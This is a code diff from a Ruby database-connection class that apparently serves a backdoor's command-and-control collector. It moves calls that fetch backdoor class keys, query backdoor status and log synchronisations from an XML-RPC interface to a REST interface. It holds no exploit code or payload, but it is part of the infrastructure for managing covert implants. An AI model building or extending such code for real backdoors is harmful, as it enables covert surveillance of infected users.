@@ -41,8 +41,7 @@ class DB
 
     # the username is an unique identifier for each machine.
     # we use the MD5 of the MAC address
-    #TODO: remove the RSS retro-compatibility
-    @username = Digest::MD5.hexdigest(UUIDTools::UUID.mac_address.to_s) + "RSS"
+    @username = Digest::MD5.hexdigest(UUIDTools::UUID.mac_address.to_s)
     # the password is a signature taken from a file
     @password = File.read(Config.file('DB_SIGN'))
 
@@ -67,7 +66,7 @@ class DB
   def connect!
     trace :info, "Checking the DB connection [#{@host}]..."
     # during the transition we log in to both xml-rpc and rest interfaces
-    if @db.login(@username, @password) and @db_rest.login(@username, @password) then
+    if @db.login(@username + "RSS", @password) and @db_rest.login(@username, @password) then
       @available = true
       trace :info, "Connected to [#{@host}]"
     else
@@ -133,7 +132,7 @@ class DB
       @network_signature = net_sig unless net_sig.nil?
 
       # get the classkey of every backdoor
-      keys = db_call :class_keys
+      keys = db_rest_call :class_keys
       @class_keys = keys unless keys.nil?
 
       # errors while retrieving the data from the db
@@ -190,7 +189,7 @@ class DB
     return nil unless @available
     
     # ask to the db the class key
-    key = db_call :class_keys, build_id
+    key = db_rest_call :class_keys, build_id
 
     # save the class key in the cache (memory and permanent)
     if not key.nil? then
@@ -210,14 +209,14 @@ class DB
   end
 
   # returns ALWAYS the status of a backdoor
-  def status_of(build_id, instance_id, subtype)
+  def backdoor_status(build_id, instance_id, subtype)
     # if the database has gone, reply with a fake response in order for the sync to continue
     return DB::UNKNOWN_BACKDOOR, 0 unless @available
 
     trace :debug, "Asking the status of [#{build_id}] to the db"
 
     # ask the database the status of the backdoor
-    status, bid = db_call :status_of, build_id, instance_id, subtype
+    status, bid = db_rest_call :backdoor_status, build_id, instance_id, subtype
 
     # if status is nil, the db down. btw we must not fail, fake the reply
     return (status.nil?) ? [DB::UNKNOWN_BACKDOOR, 0] : [status, bid]
@@ -228,7 +227,6 @@ class DB
     return unless @available
 
     # tell the db that the backdoor has synchronized
-    db_call :sync_start, session[:bid], version, user, device, source, time
     db_rest_call :sync_start, session, version, user, device, source, time
   end
 
